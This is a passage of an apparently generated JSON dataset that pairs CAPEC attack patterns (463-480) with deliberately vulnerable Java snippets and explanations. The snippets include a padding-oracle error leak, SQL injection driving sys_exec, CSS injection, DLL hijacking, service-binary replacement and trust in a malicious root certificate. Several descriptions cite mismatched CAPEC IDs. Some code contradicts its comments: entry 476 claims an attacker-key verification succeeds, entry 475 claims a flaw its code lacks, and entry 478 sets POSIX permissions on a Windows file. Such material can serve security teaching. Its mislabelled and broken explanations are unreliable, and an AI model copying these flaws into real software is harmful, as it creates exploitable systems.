        "code_snippet": "import javax.crypto.Cipher;\nimport javax.crypto.spec.SecretKeySpec;\nimport javax.crypto.spec.IvParameterSpec;\nimport java.util.Base64;\n\npublic class PaddingOracleExample {\n    private static final String KEY = \"1234567890123456\"; // Example key\n    private static final String INIT_VECTOR = \"RandomInitVector\"; // Example IV\n\n    public static void main(String[] args) {\n        try {\n            String encrypted = encrypt(\"Hello World\");\n            System.out.println(\"Encrypted: \" + encrypted);\n            decrypt(encrypted);\n        } catch (Exception ex) {\n            ex.printStackTrace();\n        }\n    }\n\n    public static String encrypt(String value) throws Exception {\n        IvParameterSpec iv = new IvParameterSpec(INIT_VECTOR.getBytes(\"UTF-8\"));\n        SecretKeySpec skeySpec = new SecretKeySpec(KEY.getBytes(\"UTF-8\"), \"AES\");\n\n        Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5PADDING\");\n        cipher.init(Cipher.ENCRYPT_MODE, skeySpec, iv);\n\n        byte[] encrypted = cipher.doFinal(value.getBytes());\n        return Base64.getEncoder().encodeToString(encrypted);\n    }\n\n    public static void decrypt(String encrypted) {\n        try {\n            IvParameterSpec iv = new IvParameterSpec(INIT_VECTOR.getBytes(\"UTF-8\"));\n            SecretKeySpec skeySpec = new SecretKeySpec(KEY.getBytes(\"UTF-8\"), \"AES\");\n\n            Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5PADDING\");\n            cipher.init(Cipher.DECRYPT_MODE, skeySpec, iv);\n\n            byte[] original = cipher.doFinal(Base64.getDecoder().decode(encrypted));\n            System.out.println(\"Decrypted: \" + new String(original));\n        } catch (Exception ex) {\n            // CWE-209: Generation of Error Message Containing Sensitive Information\n            System.out.println(\"Decryption error: \" + ex.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of AES encryption and decryption using CBC mode with PKCS5 padding. The main vulnerability lies in the `decrypt` method, where an exception is caught and an error message is printed that could potentially leak information about padding errors (CWE-209). This can be exploited in a Padding Oracle Attack, where an attacker can use the error messages to decrypt data without knowing the encryption key. The code also lacks integrity checks (CWE-649, CWE-354), making it susceptible to tampering. The `encrypt` method encrypts a plaintext string, and the `decrypt` method attempts to decrypt it, printing an error message if decryption fails, which is the core idea of the Padding Oracle Crypto Attack (CAPEC-463)."
    },
    {
        "capec_id": "464",
        "capec_name": "Evercookie",
        "code_snippet": "import java.util.Base64;\nimport javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class EvercookieExample {\n    private static final String COOKIE_NAME = \"evercookie\";\n    private static final String COOKIE_VALUE = \"sensitiveData\";\n\n    public static void setEvercookie(HttpServletResponse response) {\n        String encodedValue = Base64.getEncoder().encodeToString(COOKIE_VALUE.getBytes());\n        Cookie cookie = new Cookie(COOKIE_NAME, encodedValue);\n        cookie.setMaxAge(60 * 60 * 24 * 365); // 1 year\n        response.addCookie(cookie);\n    }\n\n    public static void replicateCookie(HttpServletRequest request, HttpServletResponse response) {\n        Cookie[] cookies = request.getCookies();\n        if (cookies != null) {\n            for (Cookie cookie : cookies) {\n                if (COOKIE_NAME.equals(cookie.getName())) {\n                    setEvercookie(response); // Replicate the cookie\n                }\n            }\n        }\n    }\n\n    public static void main(String[] args) {\n        // Simulate setting and replicating the evercookie\n        HttpServletResponse response = null; // Assume this is provided\n        HttpServletRequest request = null; // Assume this is provided\n        setEvercookie(response);\n        replicateCookie(request, response);\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of an 'evercookie,' which is a highly persistent cookie that can be replicated across different storage locations. The `setEvercookie` method sets a cookie with a base64-encoded value, simulating the storage of sensitive information. The `replicateCookie` method checks for the presence of the evercookie and replicates it if found, ensuring its persistence. This code embodies the main idea of CAPEC-359 by creating a cookie that is difficult to remove, and it touches on related CWEs such as the use of persistent cookies containing sensitive information (CWE-539), reliance on cookies without validation (CWE-784, CWE-565), and cleartext storage of sensitive information in a cookie (CWE-315)."
    },
    {
        "capec_id": "465",
        "capec_name": "Transparent Proxy Abuse",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class TransparentProxy {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            new Thread(new ProxyHandler(clientSocket)).start();\n        }\n    }\n}\n\nclass ProxyHandler implements Runnable {\n    private Socket clientSocket;\n\n    public ProxyHandler(Socket clientSocket) {\n        this.clientSocket = clientSocket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            InputStream clientInput = clientSocket.getInputStream();\n            OutputStream clientOutput = clientSocket.getOutputStream();\n\n            // Read client request\n            BufferedReader reader = new BufferedReader(new InputStreamReader(clientInput));\n            String requestLine = reader.readLine();\n            StringBuilder requestBuilder = new StringBuilder();\n            while (requestLine != null && !requestLine.isEmpty()) {\n                requestBuilder.append(requestLine).append(\"\\r\\n\");\n                requestLine = reader.readLine();\n            }\n            requestBuilder.append(\"\\r\\n\");\n            String request = requestBuilder.toString();\n\n            // Forward request to the intended server\n            Socket serverSocket = new Socket(\"example.com\", 80);\n            OutputStream serverOutput = serverSocket.getOutputStream();\n            serverOutput.write(request.getBytes());\n            serverOutput.flush();\n\n            // Read server response\n            InputStream serverInput = serverSocket.getInputStream();\n            BufferedReader serverReader = new BufferedReader(new InputStreamReader(serverInput));\n            String responseLine = serverReader.readLine();\n            StringBuilder responseBuilder = new StringBuilder();\n            while (responseLine != null && !responseLine.isEmpty()) {\n                responseBuilder.append(responseLine).append(\"\\r\\n\");\n                responseLine = serverReader.readLine();\n            }\n            responseBuilder.append(\"\\r\\n\");\n            String response = responseBuilder.toString();\n\n            // Forward response to the client\n            clientOutput.write(response.getBytes());\n            clientOutput.flush();\n\n            // Close connections\n            serverSocket.close();\n            clientSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple transparent proxy server. The proxy listens for incoming client connections on port 8080. When a client connects, it reads the client's HTTP request, forwards it to an external server (example.com), reads the server's response, and then forwards the response back to the client. This process is done transparently, meaning the client is unaware of the proxy's presence. The code embodies the main idea of CAPEC-441 (Transparent Proxy Abuse) and highlights potential vulnerabilities such as CWE-441 (Unintended Proxy or Intermediary), CWE-444 (Inconsistent Interpretation of HTTP Requests), and CWE-212 (Improper Removal of Sensitive Information). The proxy does not validate or sanitize the requests and responses, which can lead to security issues like request smuggling or leaking sensitive information."
    },
    {
        "capec_id": "466",
        "capec_name": "Leveraging Active Adversary in the Middle Attacks to Bypass Same Origin Policy",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class VulnerableHttpClient {\n    public static void main(String[] args) {\n        try {\n            // URL of a non-sensitive website that does not use TLS\n            URL url = new URL(\"http://example.com/data\");\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            // Read the response\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuilder content = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n\n            // Print the response content\n            System.out.println(content.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple HTTP client that makes a GET request to a non-sensitive website using an unencrypted HTTP connection. The code does not verify the identity of the server (CWE-300) and does not ensure the integrity of the communication channel (CWE-923). This makes it vulnerable to an active adversary in the middle attack (CAPEC-94), where an attacker can intercept and manipulate the communication between the client and the server. The lack of TLS (HTTPS) means that the communication is not secure, allowing an attacker to bypass the same origin policy protection in the victim's browser."
    },
    {
        "capec_id": "467",
        "capec_name": "Cross Site Identification",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.PrintWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Scanner;\n\n@WebServlet(\"/fetchUserInfo\")\npublic class FetchUserInfoServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String socialNetworkApiUrl = \"https://socialnetwork.com/api/userinfo?session=\" + request.getParameter(\"session\");\n        URL url = new URL(socialNetworkApiUrl);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(\"GET\");\n        conn.setRequestProperty(\"Accept\", \"application/json\");\n\n        if (conn.getResponseCode() != 200) {\n            throw new RuntimeException(\"Failed : HTTP error code : \" + conn.getResponseCode());\n        }\n\n        Scanner scanner = new Scanner(url.openStream());\n        StringBuilder responseStr = new StringBuilder();\n        while (scanner.hasNext()) {\n            responseStr.append(scanner.nextLine());\n        }\n        scanner.close();\n\n        response.setContentType(\"application/json\");\n        PrintWriter out = response.getWriter();\n        out.print(responseStr.toString());\n        out.flush();\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a Cross Site Identification attack. The servlet fetches user information from a social networking site using an active session identifier provided as a query parameter. The code constructs a URL with the session identifier and sends a GET request to the social network's API to retrieve user information. This information is then returned to the client. The code is vulnerable to several issues: \n1. CWE-352 (CSRF): The servlet does not verify if the request is intentionally made by the user.\n2. CWE-359 (Exposure of Private Personal Information): The servlet exposes user information without proper authorization checks.\n3. CWE-598 (Use of GET Request Method With Sensitive Query Strings): The session identifier is included in the URL query string.\n4. CWE-79 (Cross-site Scripting): The response is directly written to the output without proper sanitization, making it vulnerable to XSS attacks.\nThis code snippet embodies the main idea of CAPEC-111 (Cross Site Identification) by demonstrating how an attacker can harvest identifying information from a victim's active session with a social networking site."
    },
    {
        "capec_id": "468",
        "capec_name": "Generic Cross-Browser Cross-Domain Theft",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class CSSInjectionServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String cssUrl = request.getParameter(\"cssUrl\");\n        if (cssUrl != null && !cssUrl.isEmpty()) {\n            response.setContentType(\"text/css\");\n            response.getWriter().write(\"@import url('\" + cssUrl + \"');\");\n        }\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability related to the 'Generic Cross-Browser Cross-Domain Theft' attack. The servlet takes a 'cssUrl' parameter from the request and directly includes it in a CSS @import statement without proper validation or sanitization. This can lead to CSS injection, where an attacker can inject a malicious CSS URL that could steal sensitive data from the victim's browser. The code snippet embodies CWE-707 (Improper Neutralization), CWE-79 (Cross-site Scripting), and CWE-838 (Inappropriate Encoding for Output Context) by not properly handling and neutralizing user input before including it in the CSS response."
    },
    {
        "capec_id": "469",
        "capec_name": "HTTP DoS",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableHttpDoSServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        // Simulate resource allocation without limits\n        while (true) {\n            // Keep the connection open indefinitely\n            response.getWriter().write(\"Holding connection open...\");\n            response.getWriter().flush();\n            try {\n                Thread.sleep(1000); // Sleep to simulate delay\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability to an HTTP DoS attack. The `doGet` method keeps the HTTP connection open indefinitely by continuously writing to the response and flushing the output stream. This simulates the behavior of an attacker keeping the HTTP session alive indefinitely, which can exhaust the server's resources. The code does not impose any limits on resource allocation (CWE-770) and does not release resources after their effective lifetime (CWE-772). This can lead to resource depletion (CWE-410), making the server unable to handle legitimate requests."
    },
    {
        "capec_id": "470",
        "capec_name": "Expanding Control over the Operating System from the Database",
        "code_snippet": "import java.sql.Connection;\nimport java.sql.DriverManager;\nimport java.sql.ResultSet;\nimport java.sql.Statement;\n\npublic class VulnerableDatabaseAccess {\n    public static void main(String[] args) {\n        String url = \"jdbc:mysql://localhost:3306/mydatabase\";\n        String user = \"root\";\n        String password = \"password\";\n        String query = \"SELECT * FROM users WHERE username = '\" + args[0] + \"'\";\n\n        try {\n            Connection conn = DriverManager.getConnection(url, user, password);\n            Statement stmt = conn.createStatement();\n            ResultSet rs = stmt.executeQuery(query);\n\n            while (rs.next()) {\n                System.out.println(\"User: \" + rs.getString(\"username\"));\n            }\n\n            // Execute a system command using a stored procedure\n            String systemCommand = \"CALL sys_exec('\" + args[1] + \"')\";\n            stmt.execute(systemCommand);\n\n            rs.close();\n            stmt.close();\n            conn.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable database access scenario that embodies the main idea of the CAPEC 'Expanding Control over the Operating System from the Database'. The code connects to a MySQL database using hardcoded credentials (CWE-250: Execution with Unnecessary Privileges) and constructs an SQL query using unvalidated user input (CWE-89: SQL Injection). Additionally, it executes a system command via a stored procedure using user input, which can compromise the operating system and potentially allow the attacker to gain further control over the host machine. This example highlights the risks of improper input validation and excessive privileges in database operations."
    },
    {
        "capec_id": "471",
        "capec_name": "Search Order Hijacking",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardCopyOption;\n\npublic class LibraryLoader {\n    public static void main(String[] args) {\n        String libraryName = \"example.dll\";\n        String currentDir = System.getProperty(\"user.dir\");\n        String tempDir = System.getProperty(\"java.io.tmpdir\");\n\n        // Vulnerable: Loads library from the current directory first\n        try {\n            Path source = Paths.get(currentDir, libraryName);\n            Path target = Paths.get(tempDir, libraryName);\n            Files.copy(source, target, StandardCopyOption.REPLACE_EXISTING);\n            System.load(target.toString());\n            System.out.println(\"Library loaded from: \" + target.toString());\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable library loading mechanism that embodies the concept of 'Search Order Hijacking' (CAPEC-471). The code attempts to load a DLL (Dynamic Link Library) named 'example.dll' from the current working directory first. If an attacker places a malicious 'example.dll' in the current directory, the application will load the rogue library instead of the legitimate one. This vulnerability is related to CWE-427 (Uncontrolled Search Path Element) and CWE-426 (Untrusted Search Path). The code does not verify the integrity or authenticity of the library, making it susceptible to hijacking attacks."
    },
    {
        "capec_id": "472",
        "capec_name": "Browser Fingerprinting",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class BrowserFingerprintingServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userAgent = request.getHeader(\"User-Agent\");\n        String browserInfo = \"\";\n\n        if (userAgent != null) {\n            if (userAgent.contains(\"Chrome\")) {\n                browserInfo = \"Google Chrome\";\n            } else if (userAgent.contains(\"Firefox\")) {\n                browserInfo = \"Mozilla Firefox\";\n            } else if (userAgent.contains(\"MSIE\") || userAgent.contains(\"Trident\")) {\n                browserInfo = \"Internet Explorer\";\n            } else if (userAgent.contains(\"Safari\")) {\n                browserInfo = \"Apple Safari\";\n            }\n        }\n\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\");\n        response.getWriter().println(\"<script>\");\n        response.getWriter().println(\"var browserInfo = '\" + browserInfo + \"';\");\n        response.getWriter().println(\"// Exploit code can be added here based on browserInfo\");\n        response.getWriter().println(\"</script>\");\n        response.getWriter().println(\"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a basic example of browser fingerprinting. The servlet reads the 'User-Agent' header from the HTTP request to determine the type of browser the client is using. Based on the 'User-Agent' string, it identifies the browser and sets a JavaScript variable 'browserInfo' with the browser name. This information can then be used to tailor exploit code specific to the identified browser. The code snippet embodies the main idea of CAPEC-200: Browser Fingerprinting, by showing how an attacker can gather browser-specific information to potentially exploit known vulnerabilities. The code also touches on related CWEs, such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by exposing the browser type, and CWE-79 (Improper Neutralization of Input During Web Page Generation) by potentially allowing XSS attacks through the unescaped 'browserInfo' variable."
    },
    {
        "capec_id": "473",
        "capec_name": "Signature Spoof",
        "code_snippet": "import java.security.*;\nimport java.util.Base64;\n\npublic class SignatureSpoofExample {\n    public static void main(String[] args) throws Exception {\n        // Generate a key pair\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        keyGen.initialize(2048);\n        KeyPair pair = keyGen.generateKeyPair();\n        PrivateKey privateKey = pair.getPrivate();\n        PublicKey publicKey = pair.getPublic();\n\n        // Message to be signed\n        String message = \"This is a secret message\";\n\n        // Sign the message\n        Signature signature = Signature.getInstance(\"SHA256withRSA\");\n        signature.initSign(privateKey);\n        signature.update(message.getBytes());\n        byte[] signedMessage = signature.sign();\n\n        // Simulate an attacker modifying the message\n        String tamperedMessage = \"This is a tampered message\";\n\n        // Verify the signature with the tampered message\n        signature.initVerify(publicKey);\n        signature.update(tamperedMessage.getBytes());\n        boolean isVerified = signature.verify(signedMessage);\n\n        // Output the result\n        System.out.println(\"Is the tampered message verified? \" + isVerified);\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker can spoof a signature by modifying the message. The code generates a key pair, signs an original message, and then attempts to verify the signature with a tampered message. The verification should fail, but if the system does not properly enforce message integrity (CWE-924) or uses a broken cryptographic algorithm (CWE-327), it might incorrectly verify the tampered message. This embodies the main idea of the CAPEC 'Signature Spoof' by showing how improper validation and enforcement can lead to security vulnerabilities."
    },
    {
        "capec_id": "474",
        "capec_name": "Signature Spoofing by Key Theft",
        "code_snippet": "import java.security.KeyPair;\nimport java.security.KeyPairGenerator;\nimport java.security.PrivateKey;\nimport java.security.PublicKey;\nimport java.security.Signature;\nimport java.util.Base64;\n\npublic class SignatureSpoofingExample {\n    private static PrivateKey stolenPrivateKey;\n    private static PublicKey publicKey;\n\n    public static void main(String[] args) throws Exception {\n        // Generate key pair\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        keyGen.initialize(2048);\n        KeyPair pair = keyGen.generateKeyPair();\n        stolenPrivateKey = pair.getPrivate();\n        publicKey = pair.getPublic();\n\n        // Sign data with stolen private key\n        String data = \"Sensitive data\";\n        String signature = signData(data, stolenPrivateKey);\n\n        // Verify signature with public key\n        boolean isVerified = verifySignature(data, signature, publicKey);\n        System.out.println(\"Signature verified: \" + isVerified);\n    }\n\n    private static String signData(String data, PrivateKey privateKey) throws Exception {\n        Signature signature = Signature.getInstance(\"SHA256withRSA\");\n        signature.initSign(privateKey);\n        signature.update(data.getBytes());\n        return Base64.getEncoder().encodeToString(signature.sign());\n    }\n\n    private static boolean verifySignature(String data, String signature, PublicKey publicKey) throws Exception {\n        Signature sig = Signature.getInstance(\"SHA256withRSA\");\n        sig.initVerify(publicKey);\n        sig.update(data.getBytes());\n        return sig.verify(Base64.getDecoder().decode(signature));\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker has stolen a private key and uses it to sign data, which can then be verified using the corresponding public key. The code generates a key pair, simulates the theft of the private key, signs a piece of data with the stolen private key, and verifies the signature with the public key. This embodies the main idea of CAPEC- Signature Spoofing by Key Theft, where an attacker uses a stolen private key to forge signatures. The related CWEs are represented by the insecure handling of the private key (CWE-522), the potential for authentication bypass (CWE-290), and the lack of proper entity authentication during key exchange (CWE-322)."
    },
    {
        "capec_id": "475",
        "capec_name": "Signature Spoofing by Improper Validation",
        "code_snippet": "import java.security.Signature;\nimport java.security.KeyPair;\nimport java.security.KeyPairGenerator;\nimport java.security.PublicKey;\nimport java.security.PrivateKey;\nimport java.util.Base64;\n\npublic class SignatureSpoofingExample {\n    public static void main(String[] args) throws Exception {\n        // Generate a key pair\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        keyGen.initialize(2048);\n        KeyPair keyPair = keyGen.generateKeyPair();\n        PublicKey publicKey = keyPair.getPublic();\n        PrivateKey privateKey = keyPair.getPrivate();\n\n        // Sign the data\n        String data = \"Sensitive data\";\n        Signature signature = Signature.getInstance(\"SHA256withRSA\");\n        signature.initSign(privateKey);\n        signature.update(data.getBytes());\n        byte[] signedData = signature.sign();\n        String signedDataStr = Base64.getEncoder().encodeToString(signedData);\n\n        // Verify the signature (improperly)\n        Signature signatureVerify = Signature.getInstance(\"SHA256withRSA\");\n        signatureVerify.initVerify(publicKey);\n        signatureVerify.update(data.getBytes());\n\n        // Vulnerability: Incorrectly assuming any signature is valid\n        boolean isValid = signatureVerify.verify(Base64.getDecoder().decode(signedDataStr));\n        if (isValid) {\n            System.out.println(\"Signature is valid.\");\n        } else {\n            System.out.println(\"Signature is invalid.\");\n        }\n\n        // Vulnerability: Not checking the actual signature value\n        boolean isSpoofed = signatureVerify.verify(new byte[256]); // Incorrectly verifying with an empty signature\n        if (isSpoofed) {\n            System.out.println(\"Spoofed signature is valid.\");\n        } else {\n            System.out.println(\"Spoofed signature is invalid.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where improper validation of cryptographic signatures can lead to security vulnerabilities. The code generates a key pair, signs some data, and then attempts to verify the signature. However, it contains a critical flaw: it incorrectly assumes that any signature is valid without properly checking the actual signature value. This can be exploited by an adversary to spoof signatures, leading to potential authentication bypass and other security issues. The code highlights CWE-347 (Improper Verification of Cryptographic Signature) and CWE-327 (Use of a Broken or Risky Cryptographic Algorithm) by showing how improper signature verification can be exploited."
    },
    {
        "capec_id": "476",
        "capec_name": "Signature Spoofing by Misrepresentation",
        "code_snippet": "import java.security.Signature;\nimport java.security.KeyPair;\nimport java.security.KeyPairGenerator;\nimport java.security.PublicKey;\nimport java.security.PrivateKey;\nimport java.util.Base64;\n\npublic class SignatureSpoofingExample {\n    public static void main(String[] args) throws Exception {\n        // Generate a key pair for signing\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        keyGen.initialize(2048);\n        KeyPair keyPair = keyGen.generateKeyPair();\n        PrivateKey privateKey = keyPair.getPrivate();\n        PublicKey publicKey = keyPair.getPublic();\n\n        // Sign the data\n        String data = \"Important data\";\n        Signature signature = Signature.getInstance(\"SHA256withRSA\");\n        signature.initSign(privateKey);\n        signature.update(data.getBytes());\n        byte[] signedData = signature.sign();\n        String signedDataStr = Base64.getEncoder().encodeToString(signedData);\n\n        // Spoofed signature (attacker's public key)\n        KeyPair attackerKeyPair = keyGen.generateKeyPair();\n        PublicKey attackerPublicKey = attackerKeyPair.getPublic();\n\n        // Verify the signature (incorrectly using attacker's public key)\n        Signature verifySignature = Signature.getInstance(\"SHA256withRSA\");\n        verifySignature.initVerify(attackerPublicKey); // CWE-347: Improper Verification of Cryptographic Signature\n        verifySignature.update(data.getBytes());\n        boolean isVerified = verifySignature.verify(Base64.getDecoder().decode(signedDataStr));\n\n        // Output the result\n        System.out.println(\"Signature verified: \" + isVerified); // This will incorrectly print 'true'\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an attacker can spoof a signature by misrepresenting the signer's identity. The code generates a key pair and signs some data. However, during the verification process, it incorrectly uses an attacker's public key instead of the legitimate signer's public key (CWE-347: Improper Verification of Cryptographic Signature). This leads to the signature being incorrectly verified as valid, embodying the main idea of the CAPEC 'Signature Spoofing by Misrepresentation'. The code highlights the importance of correctly verifying cryptographic signatures to prevent authentication bypass and other related security issues."
    },
    {
        "capec_id": "477",
        "capec_name": "Signature Spoofing by Mixing Signed and Unsigned Content",
        "code_snippet": "import java.security.Signature;\nimport java.security.KeyPair;\nimport java.security.KeyPairGenerator;\nimport java.security.PrivateKey;\nimport java.security.PublicKey;\nimport java.util.Base64;\n\npublic class SignatureSpoofingExample {\n    public static void main(String[] args) throws Exception {\n        // Generate key pair\n        KeyPairGenerator keyGen = KeyPairGenerator.getInstance(\"RSA\");\n        keyGen.initialize(2048);\n        KeyPair keyPair = keyGen.generateKeyPair();\n        PrivateKey privateKey = keyPair.getPrivate();\n        PublicKey publicKey = keyPair.getPublic();\n\n        // Original signed data\n        String signedData = \"This is signed data.\";\n        String signature = signData(signedData, privateKey);\n\n        // Unsigned data\n        String unsignedData = \"This is unsigned data.\";\n\n        // Mix signed and unsigned data\n        String mixedData = signedData + unsignedData;\n\n        // Verify mixed data (incorrectly)\n        boolean isVerified = verifyData(mixedData, signature, publicKey);\n        System.out.println(\"Verification result: \" + isVerified);\n    }\n\n    public static String signData(String data, PrivateKey privateKey) throws Exception {\n        Signature signature = Signature.getInstance(\"SHA256withRSA\");\n        signature.initSign(privateKey);\n        signature.update(data.getBytes());\n        return Base64.getEncoder().encodeToString(signature.sign());\n    }\n\n    public static boolean verifyData(String data, String signatureStr, PublicKey publicKey) throws Exception {\n        Signature signature = Signature.getInstance(\"SHA256withRSA\");\n        signature.initVerify(publicKey);\n        signature.update(data.getBytes());\n        byte[] signatureBytes = Base64.getDecoder().decode(signatureStr);\n        return signature.verify(signatureBytes);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an attacker can exploit the mixing of signed and unsigned content. The code generates a key pair and signs a piece of data. It then creates a mixed data string by concatenating signed and unsigned data. The verification function incorrectly attempts to verify the mixed data as if it were entirely signed, leading to a potential security flaw. This example embodies the CAPEC 'Signature Spoofing by Mixing Signed and Unsigned Content' and highlights related weaknesses such as improper verification of cryptographic signatures (CWE-347) and protection mechanism failure (CWE-693)."
    },
    {
        "capec_id": "478",
        "capec_name": "Modification of Windows Service Configuration",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.attribute.PosixFilePermission;\nimport java.nio.file.attribute.PosixFilePermissions;\nimport java.util.Set;\n\npublic class WindowsServiceModifier {\n    public static void main(String[] args) {\n        String serviceConfigPath = \"C:\\\\Windows\\\\System32\\\\service.exe\";\n        String maliciousBinaryPath = \"C:\\\\malicious.exe\";\n\n        try {\n            // Improper Access Control: No validation of user permissions\n            Files.copy(Paths.get(maliciousBinaryPath), Paths.get(serviceConfigPath), java.nio.file.StandardCopyOption.REPLACE_EXISTING);\n\n            // External Control of System or Configuration Setting: Changing service configuration\n            Set<PosixFilePermission> perms = PosixFilePermissions.fromString(\"rwxrwxrwx\");\n            Files.setPosixFilePermissions(Paths.get(serviceConfigPath), perms);\n\n            System.out.println(\"Service configuration modified to execute malicious binary.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an attacker can modify the execution parameters of a Windows service to execute a malicious binary. The code does not validate user permissions (CWE-284: Improper Access Control) and allows external control of system settings (CWE-15: External Control of System or Configuration Setting). The `Files.copy` method replaces the legitimate service executable with a malicious one, and `Files.setPosixFilePermissions` sets the file permissions to allow full access, representing a misconfiguration that could be exploited."
    },
    {
        "capec_id": "479",
        "capec_name": "Malicious Root Certificate",
        "code_snippet": "import java.io.FileInputStream;\nimport java.security.KeyStore;\nimport java.security.cert.Certificate;\nimport java.security.cert.CertificateFactory;\nimport java.security.cert.X509Certificate;\nimport javax.net.ssl.TrustManagerFactory;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.HttpsURLConnection;\nimport java.net.URL;\n\npublic class MaliciousRootCertExample {\n    public static void main(String[] args) throws Exception {\n        // Load the malicious root certificate\n        FileInputStream fis = new FileInputStream(\"malicious_root_cert.crt\");\n        CertificateFactory cf = CertificateFactory.getInstance(\"X.509\");\n        X509Certificate maliciousCert = (X509Certificate) cf.generateCertificate(fis);\n        fis.close();\n\n        // Create a KeyStore and add the malicious certificate\n        KeyStore ks = KeyStore.getInstance(KeyStore.getDefaultType());\n        ks.load(null, null);\n        ks.setCertificateEntry(\"maliciousRoot\", maliciousCert);\n\n        // Initialize a TrustManagerFactory with the KeyStore\n        TrustManagerFactory tmf = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());\n        tmf.init(ks);\n\n        // Initialize an SSLContext with the TrustManagerFactory\n        SSLContext sslContext = SSLContext.getInstance(\"TLS\");\n        sslContext.init(null, tmf.getTrustManagers(), new java.security.SecureRandom());\n\n        // Set the default SSLContext to use the malicious root certificate\n        HttpsURLConnection.setDefaultSSLSocketFactory(sslContext.getSocketFactory());\n\n        // Connect to a website using the malicious root certificate\n        URL url = new URL(\"https://example.com\");\n        HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();\n        conn.connect();\n\n        System.out.println(\"Connected to \" + url + \" using a malicious root certificate.\");\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary might exploit a weakness in authorization to install a malicious root certificate on a compromised system. The code loads a malicious root certificate from a file, adds it to a KeyStore, and initializes an SSLContext with this KeyStore. The SSLContext is then set as the default for all HTTPS connections. This allows the adversary to intercept and spoof HTTPS connections without triggering security warnings, as the malicious root certificate is trusted by the system. This example embodies the main idea of the CAPEC by showing how improper certificate validation and improper access control can be exploited to compromise secure communications."
    },
    {
        "capec_id": "480",
        "capec_name": "Escaping Virtualization",
